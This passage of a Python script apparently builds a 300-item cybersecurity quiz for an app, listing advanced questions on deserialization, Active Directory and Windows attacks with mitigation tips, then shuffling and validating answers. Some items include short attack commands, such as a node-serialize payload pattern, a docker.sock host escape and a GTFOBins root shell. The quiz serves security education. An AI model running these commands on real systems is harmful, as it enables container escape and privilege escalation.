         ["Passing untrusted JSON strings containing Immediately Invoked Function Expressions (IIFE) like '{\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}' to unserialize(), executing arbitrary system commands", "A tool for translating JavaScript to Python", "An error in database serialization algorithms", "A software driver for computer monitors"],
         0, "node-serialize evaluates embedded functions during deserialization, granting immediate remote code execution upon parsing untrusted payloads.", "Never deserialize untrusted input; use standard JSON.parse() which safely parses data without code execution."),

        (269, "What is 'Java Insecure Deserialization' and 'ysoserial' gadget chains?",
         ["Exploiting ObjectInputStream.readObject() on untrusted byte streams using pre-built library gadget chains (e.g. CommonsCollections, Spring) to execute arbitrary commands upon object instantiation", "A cereal breakfast brand for programmers", "A tool for formatting Java source code", "An operating system formatting tool"],
         0, "Insecure Java deserialization invokes readObject() callbacks that chain together legitimate library classes to trigger Runtime.getRuntime().exec().", "Avoid Java native serialization; use safe JSON/Protobuf formats or implement ObjectInputFilter class whitelisting."),

        (270, "What is 'PHP Object Injection' (unserialize() vulnerability)?",
         ["Passing attacker-controlled serialized strings to PHP unserialize(), triggering magic methods (__wakeup(), __destruct(), __toString()) in vulnerable classes to achieve file deletion or RCE", "Injecting medicine into computer servers", "A tool for organizing PHP code files", "An error in PHP memory allocation"],
         0, "Attackers craft POP (Property-Oriented Programming) gadget chains utilizing class magic methods to execute arbitrary code during object destruction.", "Use json_decode() / json_encode() for data serialization rather than PHP native serialize() / unserialize()."),

        (271, "What is 'Race Condition - Double Spending' in transactional web applications?",
         ["Submitting concurrent, simultaneous HTTP requests to a checkout or transfer endpoint faster than the database can lock rows, exploiting lack of atomic transactions to redeem coupons or withdraw balances multiple times", "Spending money twice at a physical store", "A race between two computer processors", "An error in credit card chip readers"],
         0, "Without proper database isolation levels or row locks ('SELECT ... FOR UPDATE'), concurrent threads read the old balance before writing updates, duplicating funds.", "Implement database row-level locking, atomic transactions, and distributed Redis locks on balance modifications."),

        (272, "What is 'Web Cache Poisoning' via unkeyed HTTP headers?",
         ["Manipulating unkeyed HTTP request headers (e.g. X-Forwarded-Host, X-Original-URL) so the caching proxy caches a malicious or XSS-laden response and serves it to all subsequent visitors", "Pouring poison into physical computer cooling systems", "A software tool for cleaning browser cache files", "An error in database query optimization"],
         0, "Unkeyed headers are ignored by cache key algorithms but evaluated by backend servers, allowing attackers to poison shared CDN caches with malicious payloads.", "Strip or include all evaluated request headers in the CDN cache key configuration."),

        (273, "What is 'Web Cache Deception' attack?",
         ["Crafting a URL to a dynamic authenticated page with a static extension (e.g. /profile/account.css) so caching servers cache the victim's private profile and expose it to the attacker publicly", "A deceptive advertising banner on websites", "A software program for compressing CSS files", "An error in web browser cookie storage"],
         0, "Caching proxies treat '.css'/'.jpg' as static public assets. When an authenticated user clicks the link, their private HTML response is cached and readable by anyone.", "Configure web servers to respect 'Cache-Control: no-store, private' headers on all dynamic responses regardless of URL file extensions."),

        (274, "What is 'Zip Slip' directory traversal vulnerability during archive extraction?",
         ["Extracting archive files containing filenames with path traversal characters ('../../etc/cron.d/malicious') that write files outside the intended extraction target directory", "Slipping on physical wires in a server room", "A software tool for compressing zip files", "An error in Windows file explorer"],
         0, "Vulnerable unzipping libraries fail to validate destination paths, allowing malicious archives to overwrite arbitrary system configuration files or executables.", "Canonicalize and validate that extracted file paths start with the intended target directory path before writing files to disk."),

        (275, "What is 'Blind XXE via Out-of-Band (OOB) XML Parameter Entities'?",
         ["Using XML parameter entities in an external DTD to exfiltrate local system files via HTTP requests to an attacker's listener server when XML responses are suppressed", "An attack on XML files with closed eyes", "A tool for formatting XML documents in Python", "An error in database XML schema validation"],
         0, "OOB XXE defines dynamic parameter entities that embed file contents into the URL query parameters of outbound HTTP requests.", "Disable DTDs (Document Type Definitions) and external entity parsing completely in all XML parsers."),

        (276, "What is 'AWS S3 Bucket Policy - Principal: * with PutObject' risk?",
         ["Allowing unrestricted anonymous public users to upload, overwrite, or plant malicious files inside an organization's S3 storage bucket", "A tool for organizing files in AWS cloud", "A software driver for cloud servers", "An error in AWS billing calculation"],
         0, "Overly permissive bucket policies allow external threat actors to overwrite hosted JavaScript libraries or upload ransomware payloads into corporate pipelines.", "Enable AWS S3 Block Public Access at the organization level and enforce strict least-privilege IAM bucket policies."),

        (277, "What is 'Azure AD / Entra ID Primary Refresh Token' (PRT) theft via Mimikatz?",
         ["Extracting the Azure AD PRT authentication token from LSASS / CloudAP plugin memory on an Intune-joined Windows device to bypass Conditional Access and MFA on all M365 cloud resources", "Stealing a physical smart card from an office", "A software tool for resetting Azure passwords", "An error in cloud server synchronization"],
         0, "A stolen PRT allows attackers to authenticate to any cloud application tied to Entra ID without re-prompting for MFA or passwords.", "Deploy Windows Credential Guard, enforce device compliance checks, and use Azure AD Identity Protection risk-based policies."),

        (278, "What is 'GCP IAM Service Account Key Leaks' and how to mitigate them?",
         ["Static JSON private keys exported for GCP Service Accounts leaked in GitHub repositories; mitigated by migrating to GCP Workload Identity Federation", "A software program for managing Google Drive files", "An error in Google Maps API billing", "A tool for compressing JSON files"],
         0, "Workload Identity Federation allows external workloads (GitHub Actions, AWS, on-prem) to assume GCP IAM roles via short-lived OIDC tokens without static keys.", "Disable service account key creation and enforce Workload Identity Federation across all GCP projects."),

        (279, "What is 'Docker Socket Mounting' (/var/run/docker.sock) container escape?",
         ["Mounting the host's docker.sock inside a container allows the container to issue commands to the host Docker daemon, launching a privileged root container to compromise the entire host OS", "A physical electrical socket in a server room", "A software tool for compressing Docker images", "An error in container network routing"],
         0, "Access to docker.sock is equivalent to root on the host machine. Attackers run 'docker run -v /:/host -it alpine chroot /host' to gain instant host root access.", "Never mount /var/run/docker.sock into untrusted or user-facing container workloads."),

        (280, "What is 'Kubernetes Pod Security Standards' (Privileged Container Escape)?",
         ["Containers running with 'privileged: true' or 'hostPID: true' can access host device nodes, inject into host processes, and escape container boundaries to compromise worker nodes", "A standard for building physical computer cases", "A software program for organizing Kubernetes pods", "An error in cloud server load balancing"],
         0, "Privileged containers disable all Linux kernel namespace and cgroup isolation barriers, permitting direct host takeover.", "Enforce 'Baseline' or 'Restricted' Kubernetes Pod Security Standards using admission controllers."),

        (281, "What is 'Linux SUID Binary Exploitation' via GTFOBins?",
         ["Exploiting binaries that run with SUID root permissions (e.g. nmap, vim, find) by passing execution flags (e.g. find . -exec /bin/sh \\;) to spawn an interactive root shell", "A software program for organizing Linux files", "A tool for downloading Linux wallpaper images", "An error in Linux memory allocation"],
         0, "SUID binaries execute with the privileges of the file owner (root). Misconfigured SUID flags on command execution utilities yield instant privilege escalation.", "Regularly audit SUID binaries with 'find / -perm -u=s -type f 2>/dev/null' and remove unnecessary SUID permissions."),

        (282, "What is 'Linux Shared Object Injection' (LD_PRELOAD / /etc/ld.so.preload)?",
         ["Setting LD_PRELOAD to point to a custom malicious shared library (.so) forces dynamically linked binaries to execute the malicious library's constructor functions before main()", "A software tool for loading video files", "A hardware cable connecting two hard drives", "An error in Linux screen rendering"],
         0, "LD_PRELOAD hooks dynamic linker calls, executing arbitrary code whenever any target process launches.", "Enforce file permissions on /etc/ld.so.preload and audit environment variables in privileged execution contexts."),

        (283, "What is 'Windows Token Impersonation' (SeImpersonatePrivilege / RottenPotato / PrintSpoofer)?",
         ["Service accounts possessing SeImpersonatePrivilege coerce a SYSTEM process to authenticate over Named Pipes / RPC, capturing its token and calling DuplicateTokenEx to elevate from service account to SYSTEM", "Impersonating an employee on a phone call", "A tool for formatting hard drives in Windows", "An error in Windows audio driver software"],
         0, "Service accounts (IIS, MSSQL) with SeImpersonatePrivilege can exploit tools like PrintSpoofer to achieve immediate local SYSTEM takeover.", "Remove SeImpersonatePrivilege from service accounts that do not strictly require token impersonation capabilities."),

        (284, "What is 'Windows Named Pipe Impersonation'?",
         ["A server process creating a named pipe with PIPE_ACCESS_DUPLEX and calling ImpersonateNamedPipeClient() to take on the security context of any connecting client process", "A physical water pipe running under a computer lab", "A software tool for managing network cables", "An error in Windows printer spooler"],
         0, "Attackers trick privileged processes (like SYSTEM) into writing to a malicious named pipe, capturing their access token to spawn SYSTEM shells.", "Audit named pipe creation and restrict client connection permissions on sensitive IPC endpoints."),

        (285, "What is 'Windows LSASS Memory Dumping' (e.g. using ProcDump or MiniDumpWriteDump)?",
         ["Extracting the process memory of lsass.exe to parse cleartext passwords, NTLM hashes, and Kerberos tickets stored in memory by Windows authentication packages", "Dumping physical computer hardware into a trash bin", "A software tool for cleaning hard drive partitions", "An error in computer memory allocation"],
         0, "LSASS holds domain authentication credentials. Attackers dump lsass.exe memory to extract hashes via Mimikatz offline.", "Enable Windows Defender Credential Guard, which isolates LSASS secrets inside a Virtualization-Based Security (VBS) enclave."),

        (286, "What is 'Windows Credential Guard' (LSA Protection via VBS)?",
         ["Using Virtualization-Based Security (VBS) and Hyper-V to run the Local Security Authority (LSA) inside an isolated virtual trust enclave (Virtual Secure Mode), preventing memory extraction from host administrators", "A physical lock for computer laptop screens", "A software driver for computer mice", "A program for recording desktop videos"],
         0, "Credential Guard isolates secrets in VSM; even malware running as local SYSTEM or kernel Ring 0 cannot read NTLM hashes from LSASS memory.", "Enable Credential Guard across all enterprise Windows 10/11 and Windows Server workstations and servers."),

        (287, "What is 'Windows AppLocker / WDAC Bypass via InstallUtil or Regasm'?",
         ["Using trusted, Microsoft-signed .NET framework binaries (InstallUtil.exe, Regasm.exe) to execute arbitrary unapproved C# assemblies, circumventing application whitelisting rules", "A software tool for installing games on Windows", "A method for cleaning physical computer motherboards", "An error in Windows screen resolution"],
         0, "Application whitelisting that only blocks unapproved .exe files fails when signed utilities execute arbitrary payload code embedded in DLLs.", "Deploy Windows Defender Application Control (WDAC) in enforcement mode with recommended Microsoft block rules."),

        (288, "What is 'Windows Event Log Clearing' (wevtutil cl Security) and its detection artifact?",
         ["Adversaries clearing the Security log to hide intrusion traces; Windows automatically generates Event ID 1102 ('The audit log was cleared') in the new log", "A software tool for organizing log files", "An error in Windows time synchronization", "A program for deleting temporary files"],
         0, "Clearing logs is an explicit indicator of compromise. Windows specifically logs Event ID 1102 with the account name that executed the clearing action.", "Configure SIEM alerts to trigger immediately on Event ID 1102 (Security Log Cleared) and Event ID 104 (System Log Cleared)."),

        (289, "What is 'Windows Kerberos Silver Ticket' vs 'Golden Ticket' cryptographic scope?",
         ["A Silver Ticket is signed with a specific service account's password hash and works only for that service; a Golden Ticket is signed with the KRBTGT hash and can generate tickets for any service across the entire domain", "A Silver Ticket is made of silver metal; a Golden Ticket is made of gold metal", "A Silver Ticket is only valid on Mondays; a Golden Ticket is valid every day", "There is no difference between Silver and Golden Tickets"],
         0, "Golden Tickets forge the TGT at the KDC level, compromising the entire Active Directory forest. Silver Tickets forge TGS service tickets for individual servers.", "Protect the KRBTGT account with frequent password rotations and protect individual service accounts with gMSAs."),

        (290, "What is 'Active Directory Skeleton Key' malware in Domain Controllers?",
         ["Patching LSASS process memory on Domain Controllers so that all user authentications succeed against a master hardcoded password ('skeleton key') while legitimate passwords continue to work normally", "A physical metal key used to open server room doors", "A software tool for resetting forgotten passwords", "An error in Active Directory replication"],
         0, "Skeleton Key patches the authentication validation routine in memory, granting attackers universal access to any user account without changing passwords.", "Deploy Domain Controller integrity monitoring, enforce Protected Process Light (PPL) on LSASS, and reboot DCs to clear in-memory patches."),

        (291, "What is 'Kerberos Pre-Authentication Downgrade Attack' (AS-REQ Downgrade)?",
         ["Manipulating the Supported Encryption Types in AS-REQ to force the Domain Controller to issue AS-REP responses encrypted with weak RC4-HMAC instead of AES-256, speeding up offline cracking", "A software program for speeding up computer networks", "An error in Active Directory clock synchronization", "A tool for converting passwords into numbers"],
         0, "RC4-HMAC is significantly faster to crack on GPUs than AES-256. Attackers downgrade negotiation to crack hashes in hours rather than centuries.", "Disable RC4 encryption across the Active Directory domain (enforce AES-128 and AES-256 for Kerberos)."),

        (292, "What is 'Active Directory AdminSDHolder and SDProp' persistence mechanism?",
         ["SDProp automatically overwrites ACLs of protected administrative accounts every 60 minutes with the permissions from the AdminSDHolder object; adding an attacker ACE to AdminSDHolder grants persistent administrative rights", "A software program for organizing company org charts", "A tool for deleting old user accounts in Active Directory", "An error in Active Directory schema validation"],
         0, "Attackers inject backdoor permissions into AdminSDHolder; even if an admin fixes permissions on Domain Admins, SDProp will re-apply the backdoor within 60 minutes.", "Monitor changes to the AdminSDHolder container (CN=AdminSDHolder,CN=System,DC=domain,DC=com)."),

        (293, "What is 'Active Directory GPO Abuse' (Malicious Group Policy Object)?",
         ["An attacker with write permissions on a GPO adds a scheduled task, registry key, or local admin creation script, which automatically propagates to all linked domain workstations and servers", "A software program for organizing desktop icons", "An error in Windows wallpaper rendering", "A tool for backing up server files"],
         0, "GPO abuse weaponizes legitimate Active Directory policy replication to execute commands across thousands of enterprise endpoints within minutes.", "Audit GPO write permissions and enforce strict change management and monitoring on Group Policy files in SYSVOL."),

        (294, "What is 'Active Directory PetitPotam' (MS-EFSR Abuse)?",
         ["Coercing a remote Windows host (including Domain Controllers) to authenticate to an attacker-controlled endpoint over SMB/HTTP using the Encrypting File System Remote Protocol (MS-EFSR)", "A french cooking recipe application", "A software driver for computer printers", "An error in computer memory allocation"],
         0, "PetitPotam coerces machine NTLM authentication, allowing attackers to relay the DC machine account to AD CS to gain Domain Admin in minutes.", "Disable NTLM across the domain and block MS-EFSR RPC interfaces on domain controllers."),

        (295, "What is 'NTLM Relay Attack' and why does SMB Signing prevent it?",
         ["An attacker captures NTLM authentication from a client and replays it in real-time to authenticate to a target server; SMB Signing cryptographically signs every packet, preventing message alteration or relaying", "Relaying baton batons in a running race", "A software tool for speeding up network downloads", "An error in network cable wiring"],
         0, "Relaying reuses valid challenge-response handshakes to gain unauthorized access to secondary servers. SMB signing and EPA validate endpoints cryptographically.", "Require SMB Signing ('RequireSecuritySignature=True') on all domain systems and enforce Extended Protection for Authentication (EPA)."),

        (296, "What is 'Coerced Authentication' via PrinterBug (MS-RPRN)?",
         ["Using the Print System Remote Protocol (RpcRemoteFindFirstPrinterChangeNotificationEx) to force a remote Domain Controller to authenticate back to the attacker's listener host", "A software bug in computer printers", "An error in printing documents on paper", "A tool for cleaning physical printer cartridges"],
         0, "PrinterBug abuses legacy print spooler RPC calls to force target servers to transmit their machine account NTLM credentials across the network.", "Disable the Print Spooler service on all Domain Controllers and critical infrastructure hosts."),

        (297, "What is 'Kerberos PAC Validation' and how does it prevent privilege escalation?",
         ["The Privilege Attribute Certificate (PAC) contains user group memberships signed by the KDC; servers verify the PAC signature to ensure group memberships were not forged or altered by the client", "A software program for validating physical passports", "An error in computer memory allocation", "A tool for compressing Kerberos tickets"],
         0, "PAC validation ensures that forged group memberships (like adding yourself to Domain Admins in a ticket) are detected and rejected by the KDC.", "Enforce PAC validation and ensure all Domain Controllers have recent Kerberos security updates applied."),

        (298, "What is 'Active Directory Trust Abuse' (SID History Injection)?",
         ["Injecting the Enterprise Admins SID into the 'sIDHistory' attribute of a Kerberos ticket during inter-forest or parent-child domain transitions to gain Enterprise Admin rights across the entire forest", "A psychological counseling program for employees", "A software tool for organizing domain trees", "An error in Active Directory replication"],
         0, "SID History abuse allows an attacker with Domain Admin rights in a compromised child domain to elevate to Enterprise Admin in the parent domain.", "Enable SID Filtering (Quarantine) on all external and forest trust relationships."),

        (299, "What is 'Shadow Credentials' (msDS-KeyCredentialLink) attack in Active Directory?",
         ["An attacker with write permissions over a target user/computer adds a new cryptographic public key to their 'msDS-KeyCredentialLink' attribute, allowing authentication as that user via PKINIT Kerberos PKI without knowing their password", "A shadow cast by a computer server rack", "A tool for deleting old user accounts in Active Directory", "An error in Active Directory clock synchronization"],
         0, "Shadow credentials abuse Windows Hello for Business key structures to inject legitimate public keys, granting immediate Kerberos TGT acquisition.", "Monitor modifications to the msDS-KeyCredentialLink attribute across all domain user and computer objects."),

        (300, "What is the ultimate principle of 'Defense-in-Depth' in modern enterprise cybersecurity engineering?",
         ["Layering multiple independent security controls (identity, physical, endpoint, network, application, data, and immutable recovery) so that if any single control fails, subsequent layers continue to prevent compromise", "Relying exclusively on a single impenetrable firewall", "Installing 10 different antivirus programs on one laptop", "Never connecting any computer to the internet"],
         0, "Defense-in-depth recognizes that no single security control is infallible; resilient architecture relies on overlapping, independent layers of protection.", "Implement defense-in-depth across identity verification, endpoint telemetry, zero-trust network segmentation, immutable backups, and continuous behavioral auditing.")
    ]

def balance_and_shuffle_tier(raw_data, difficulty):
    """
    Takes 100 question tuples: (id, question, options, raw_correct_idx, explanation, tip)
    Guarantees:
    - Exactly 25 questions with correct_index = 0 ('A')
    - Exactly 25 questions with correct_index = 1 ('B')
    - Exactly 25 questions with correct_index = 2 ('C')
    - Exactly 25 questions with correct_index = 3 ('D')
    - Shuffles the options so correct answer lands at designated target index.
    """
    assert len(raw_data) == 100, f"Expected 100 questions for {difficulty}, got {len(raw_data)}"
    
    # Target positions: exactly 25 of 0, 1, 2, 3
    targets = [0, 1, 2, 3] * 25
    
    # Seeded deterministic shuffle for target distribution
    seed_val = 42 if difficulty == 'beginner' else (1337 if difficulty == 'intermediate' else 9999)
    rng = random.Random(seed_val)
    rng.shuffle(targets)
    
    processed_questions = []
    
    for i, item in enumerate(raw_data):
        q_id, question, raw_options, raw_correct_idx, explanation, tip = item
        target_pos = targets[i]
        
        correct_text = raw_options[raw_correct_idx]
        incorrect_texts = [opt for idx, opt in enumerate(raw_options) if idx != raw_correct_idx]
        
        # Shuffle incorrect options deterministically
        q_rng = random.Random(q_id * 100 + seed_val)
        q_rng.shuffle(incorrect_texts)
        
        # Build new 4 options list with correct_text placed at target_pos
        new_options = [None] * 4
        new_options[target_pos] = correct_text
        
        inc_idx = 0
        for pos in range(4):
            if pos != target_pos:
                new_options[pos] = incorrect_texts[inc_idx]
                inc_idx += 1
                
        assert len(new_options) == 4
        assert new_options[target_pos] == correct_text
        assert None not in new_options
        
        processed_questions.append({
            "id": q_id,
            "difficulty": difficulty,
            "question": question,
            "options": new_options,
            "correct_index": target_pos,
            "explanation": explanation,
            "tip": tip
        })
        
    return processed_questions

def create_all_questions():
    beginner_raw = get_raw_beginner_data()
    intermediate_raw = get_raw_intermediate_data()
    advanced_raw = get_raw_advanced_data()
    
    beginner_questions = balance_and_shuffle_tier(beginner_raw, 'beginner')
    intermediate_questions = balance_and_shuffle_tier(intermediate_raw, 'intermediate')
    advanced_questions = balance_and_shuffle_tier(advanced_raw, 'advanced')
    
    all_questions = beginner_questions + intermediate_questions + advanced_questions
    return all_questions

def main():
    questions = create_all_questions()
    
    # Validation checks
    print(f"Total questions generated: {len(questions)}")
    beginner_count = sum(1 for q in questions if q['difficulty'] == 'beginner')
    intermediate_count = sum(1 for q in questions if q['difficulty'] == 'intermediate')
    advanced_count = sum(1 for q in questions if q['difficulty'] == 'advanced')
    
    print(f"Beginner count: {beginner_count}")
    print(f"Intermediate count: {intermediate_count}")
    print(f"Advanced count: {advanced_count}")
    
    assert beginner_count == 100, f"Expected 100 beginner, got {beginner_count}"
    assert intermediate_count == 100, f"Expected 100 intermediate, got {intermediate_count}"
    assert advanced_count == 100, f"Expected 100 advanced, got {advanced_count}"
    assert len(questions) == 300, f"Expected 300 total, got {len(questions)}"
    
    # Validate distribution of correct answers across A, B, C, D
    from collections import Counter
    for diff in ['beginner', 'intermediate', 'advanced']:
        diff_questions = [q for q in questions if q['difficulty'] == diff]
        counts = Counter(q['correct_index'] for q in diff_questions)
        print(f"Answer distribution for {diff.upper()}: {dict(counts)}")
        assert counts[0] == 25, f"{diff} option 0 count: {counts[0]}"
        assert counts[1] == 25, f"{diff} option 1 count: {counts[1]}"
        assert counts[2] == 25, f"{diff} option 2 count: {counts[2]}"
        assert counts[3] == 25, f"{diff} option 3 count: {counts[3]}"
        
    total_counts = Counter(q['correct_index'] for q in questions)
    print(f"Overall Answer distribution: {dict(total_counts)} (A: {total_counts[0]}, B: {total_counts[1]}, C: {total_counts[2]}, D: {total_counts[3]})")
    assert total_counts[0] == 75
    assert total_counts[1] == 75
    assert total_counts[2] == 75
    assert total_counts[3] == 75

    # Validate each question integrity
    ids = set()
    for q in questions:
        assert q['id'] not in ids, f"Duplicate ID found: {q['id']}"
        ids.add(q['id'])
        assert len(q['options']) == 4, f"Question {q['id']} does not have 4 options"
        assert 0 <= q['correct_index'] <= 3, f"Question {q['id']} has invalid correct_index: {q['correct_index']}"
        assert len(q['question'].strip()) > 10, f"Question {q['id']} question text too short"
        assert len(q['explanation'].strip()) > 10, f"Question {q['id']} explanation too short"
        assert len(q['tip'].strip()) > 5, f"Question {q['id']} tip too short"

    print("All 300 questions successfully validated with 100% integrity!")

    # 1. Save to backend
    backend_path = os.path.join(os.path.dirname(__file__), 'challenge_questions.json')
    with open(backend_path, 'w', encoding='utf-8') as f:
        json.dump(questions, f, indent=2, ensure_ascii=False)
    print(f"Saved to {backend_path}")

    # 2. Save to Android app assets
    android_assets_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'android_app', 'app', 'src', 'main', 'assets'))
    os.makedirs(android_assets_dir, exist_ok=True)
    android_assets_path = os.path.join(android_assets_dir, 'challenge_questions.json')
    with open(android_assets_path, 'w', encoding='utf-8') as f:
        json.dump(questions, f, indent=2, ensure_ascii=False)
    print(f"Saved to {android_assets_path}")

if __name__ == '__main__':
    main()
